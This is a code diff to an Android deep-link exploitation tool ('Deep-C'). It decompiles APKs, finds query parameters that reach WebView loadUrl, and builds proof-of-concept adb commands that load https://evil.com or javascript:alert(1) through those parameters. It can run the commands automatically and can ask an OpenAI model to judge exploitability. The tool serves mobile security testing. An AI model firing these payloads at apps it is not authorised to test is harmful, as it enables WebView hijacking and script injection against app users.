@@ -42,7 +42,41 @@ def banner():
 
  Deep-C | Android Deep Link Exploitation Framework By Kishor Balan
  Decompile • Detect • Validate • Exploit
+ 
+ Usage: python3 deepc.py -a <path/to/app.apk> 
+ AI verdict : python3 deepc.py -a <path/to/app.apk> --ai-review
 """)
+
+# ---------------- AI Review ---------------- #
+
+def ai_review_finding(finding):
+    try:
+        from openai import OpenAI
+        client = OpenAI()
+
+        prompt = f"""
+Mobile security expert: Analyze this deeplink finding and provide ONLY a 1-2 sentence verdict on exploitability.
+
+Activity: {finding.get('activity')}
+Level: {finding.get('level')}
+Path: {finding.get('path')}
+Query Parameter: {finding.get('query_param')}
+Weak Validation: {finding.get('weak_validation')}
+Strong Validation: {finding.get('strong_validation')}
+
+Response format: "EXPLOITABLE/NOT EXPLOITABLE: Brief reason."
+"""
+
+        response = client.chat.completions.create(
+            model="gpt-4o-mini",
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.2
+        )
+
+        return response.choices[0].message.content.strip()
+
+    except Exception as e:
+        return f"[AI Review Failed] {str(e)}"
 
 # ---------------- Helpers ---------------- #
 
@@ -58,10 +92,8 @@ def clean_dirs():
 # ---------------- Decompilation ---------------- #
 
 def decompile_manifest(apk):
-    run(
-        ["apktool", "d", apk, "-o", APKTOOL_DIR, "-f"],
-        "Decompiling APK (manifest & resources)"
-    )
+    run(["apktool", "d", apk, "-o", APKTOOL_DIR, "-f"],
+        "Decompiling APK (manifest & resources)")
     manifest = os.path.join(APKTOOL_DIR, "AndroidManifest.xml")
     if not os.path.exists(manifest):
         sys.exit("[-] AndroidManifest.xml not found")
@@ -74,23 +106,7 @@ def decompile_source_with_jadx(apk):
     os.makedirs(JADX_OUT_DIR, exist_ok=True)
 
     print("[*] Decompiling APK to Java/Kotlin source (jadx)")
-    result = subprocess.run(
-        ["jadx", "-d", JADX_OUT_DIR, apk],
-        #stdout=subprocess.PIPE,
-        #stderr=subprocess.PIPE,
-        #text=True
-    )
-
-    if result.stdout:
-        print("[jadx stdout]")
-        print(result.stdout)
-
-    if result.stderr:
-        print("[jadx stderr]")
-        print(result.stderr)
-
-   # if result.returncode != 0:
-      #  sys.exit("[-] Jadx failed during decompilation")
+    subprocess.run(["jadx", "-d", JADX_OUT_DIR, apk])
 
 def verify_jadx_output():
     if not os.path.isdir(SRC_DIR):
@@ -156,22 +172,80 @@ def find_activity_source(activity):
     return None
 
 def extract_paths_from_code(code):
+    """Enhanced path extraction with comprehensive regex patterns"""
     paths = set()
+    
+    # Enhanced regex patterns for path detection
     patterns = [
+        # Direct path comparisons
         r'getPath\(\)\.equals\("([^"]+)"\)',
+        r'uri\.getPath\(\)\s*==\s*"([^"]+)"',
+        r'uri\.getPath\(\)\.equals\("([^"]+)"\)',
+        
+        # Kotlin equivalents
         r'StringsKt\.equals\$default\(\s*uri\.getPath\(\)\s*,\s*"([^"]+)"',
-        r'uri\.getPath\(\)\s*==\s*"([^"]+)"'
+        r'uri\.path\s*==\s*"([^"]+)"',
+        
+        # Path checks and validations
+        r'path\.equals\("([^"]+)"\)',
+        r'pathSegments\.get\(\d+\)\.equals\("([^"]+)"\)',
+        r'getPathSegments\(\)\.get\(\d+\)\.equals\("([^"]+)"\)',
+        
+        # startsWith/endsWith for paths
+        r'getPath\(\)\.startsWith\("([^"]+)"\)',
+        r'getPath\(\)\.endsWith\("([^"]+)"\)',
+        r'uri\.getPath\(\)\.startsWith\("([^"]+)"\)',
+        
+        # contains checks
+        r'getPath\(\)\.contains\("([^"]+)"\)',
+        r'uri\.getPath\(\)\.contains\("([^"]+)"\)',
+        
+        # Switch/case statements
+        r'case\s+"([^"]+)"\s*:',
+        
+        # String literals that look like paths in routing logic
+        r'"(/[^"]*)"',
+        
+        # Pattern matching
+        r'Pattern\.compile\("([^"]+)"\)',
+        r'matches\("([^"]+)"\)'
     ]
 
-    for p in patterns:
-        for match in re.findall(p, code):
-            if match.startswith("/"):
+    for pattern in patterns:
+        matches = re.findall(pattern, code, re.IGNORECASE)
+        for match in matches:
+            # Filter for actual paths (start with / or contain path-like patterns)
+            if (match.startswith("/") or 
+                re.match(r'^[a-zA-Z0-9_/-]+$', match) and "/" in match):
                 paths.add(match)
 
     return list(paths)
 
 def extract_query_params(code):
-    return re.findall(r'getQueryParameter\(\s*"([^"]+)"\s*\)', code)
+    """Enhanced query parameter extraction"""
+    params = set()
+    
+    patterns = [
+        # Standard getQueryParameter calls
+        r'getQueryParameter\(\s*"([^"]+)"\s*\)',
+        r'uri\.getQueryParameter\(\s*"([^"]+)"\s*\)',
+        
+        # Kotlin variants
+        r'queryParameter\(\s*"([^"]+)"\s*\)',
+        
+        # Query parameter keys in variables
+        r'String\s+\w+\s*=\s*"([^"]+)"\s*;.*getQueryParameter\(\s*\w+\s*\)',
+        
+        # Bundle/Intent extras that might be from query params
+        r'getStringExtra\(\s*"([^"]+)"\s*\)',
+        r'getString\(\s*"([^"]+)"\s*\)'
+    ]
+    
+    for pattern in patterns:
+        matches = re.findall(pattern, code, re.IGNORECASE)
+        params.update(matches)
+    
+    return list(params)
 
 def analyze_source(path):
     if not path or not os.path.exists(path):
@@ -180,22 +254,17 @@ def analyze_source(path):
     with open(path, "r", errors="ignore") as f:
         code = f.read()
 
+    # Extract paths and query parameters from source code
+    code_paths = extract_paths_from_code(code)
     query_params = extract_query_params(code)
 
-    direct_flow = (
-        "loadUrl(" in code and
-        "getQueryParameter(" in code
-    )
-
+    direct_flow = "loadUrl(" in code and "getQueryParameter(" in code
     override_flow = (
         re.search(r'\w+\s*=\s*.*getQueryParameter\(', code) and
         re.search(r'loadUrl\(\s*\w+\s*\)', code)
     )
 
-    exploitable_flow = direct_flow or override_flow
-
-    if not exploitable_flow:
-        print("    [-] No exploitable sink flow found")
+    if not (direct_flow or override_flow):
         return None
 
     strong_validation = any(re.search(p, code) for p in STRONG_HOST_PATTERNS)
@@ -208,29 +277,28 @@ def analyze_source(path):
     else:
         level = "SAFE"
 
-    print(f"    [+] Issue classified as: {level}")
-
     return {
         "level": level,
-        "paths": extract_paths_from_code(code),
         "query_params": query_params,
+        "code_paths": code_paths,  # Include extracted paths
         "weak_validation": weak_validation,
-        "strong_validation": strong_validation,
-        "code": code[:4000]
+        "strong_validation": strong_validation
     }
 
 # ---------------- PoC Generation ---------------- #
 
-def generate_pocs(pkg, activity, deeplink):
+def generate_pocs(pkg, activity, deeplink, param_name):
     scheme = deeplink.get("scheme") or "https"
     host = deeplink.get("host") or ""
     path = deeplink.get("path") or "/"
-
     base = f"{scheme}://{host}" if host else f"{scheme}://"
 
+    if not param_name:
+        param_name = "url"
+
     return [
-        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?h5Url=https://evil.com"',
-        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?h5Url=javascript:alert(1)"',
+        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?{param_name}=https://evil.com"',
+        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?{param_name}=javascript:alert(1)"',
         f'adb shell am start -n {pkg}/{activity}'
     ]
 
@@ -242,6 +310,8 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-a", "--apk", required=True)
     parser.add_argument("--exec", action="store_true")
+    parser.add_argument("--ai-review", action="store_true",
+                        help="Enable AI validation of findings")
     args = parser.parse_args()
 
     apk_path = os.path.abspath(args.apk)
@@ -273,46 +343,61 @@ def main():
             if not analysis or analysis["level"] == "SAFE":
                 continue
 
-            paths = (
-                analysis.get("paths")
-                or [dl.get("path") for dl in deeplinks if dl.get("path")]
-                or ["/"]
-            )
-
             print("[+] Deep Link Issue Found")
-            print(f"    Activity     : {name}")
-            print(f"    Level        : {analysis['level']}")
-            if analysis.get("query_params"):
-                print(f"    Query Params : {', '.join(analysis['query_params'])}")
-            print(f"    Source       : {src}")
+            print(f"    Activity : {name}")
+            print(f"    Level    : {analysis['level']}")
 
-            for path in paths:
-                dl = deeplinks[0]
-                dl_effective = {
-                    "scheme": dl.get("scheme"),
-                    "host": dl.get("host"),
-                    "path": path
-                }
+            # Use both extracted query params and code paths
+            param_candidates = analysis.get("query_params") or ["url"]
+            code_paths = analysis.get("code_paths", [])
+            
+            # Display extracted paths from source code
+            if code_paths:
+                print(f"    Code Paths Found: {', '.join(code_paths)}")
 
-                print(f"    Entry Path : {path}")
-                print("    PoCs:")
+            for dl in deeplinks:
+                # Use extracted paths if available, otherwise use manifest path
+                paths_to_test = code_paths if code_paths else [dl.get("path")]
+                
+                for test_path in paths_to_test:
+                    for param in param_candidates:
+                        print(f"    Entry Path : {test_path or dl.get('path')}")
+                        print(f"    Using Query Parameter: {param}")
+                        print("    PoCs:")
 
-                pocs = generate_pocs(package, name, dl_effective)
-                for p in pocs:
-                    print(f"      {p}")
-                    if args.exec:
-                        subprocess.run(p, shell=True)
+                        # Create a modified deeplink for PoC generation
+                        test_deeplink = dl.copy()
+                        if test_path:
+                            test_deeplink["path"] = test_path
 
-                results["findings"].append({
-                    "activity": name,
-                    "source": src,
-                    "path": path,
-                    "level": analysis["level"],
-                    "query_params": analysis["query_params"],
-                    "weak_validation": analysis["weak_validation"],
-                    "strong_validation": analysis["strong_validation"],
-                    "pocs": pocs
-                })
+                        pocs = generate_pocs(package, name, test_deeplink, param)
+
+                        for p in pocs:
+                            print(f"      {p}")
+                            if args.exec:
+                                subprocess.run(p, shell=True)
+
+                        finding = {
+                            "activity": name,
+                            "source": src,
+                            "path": test_path or dl.get("path"),
+                            "manifest_path": dl.get("path"),
+                            "code_paths": code_paths,
+                            "query_param": param,
+                            "level": analysis["level"],
+                            "weak_validation": analysis["weak_validation"],
+                            "strong_validation": analysis["strong_validation"],
+                            "pocs": pocs
+                        }
+
+                        if args.ai_review:
+                            print("    [*] Running AI review...")
+                            ai_output = ai_review_finding(finding)
+                            print("    [AI Verdict]")
+                            print("    " + ai_output.replace("\n", "\n    "))
+                            finding["ai_review"] = ai_output
+
+                        results["findings"].append(finding)
 
             print("-" * 70)
 
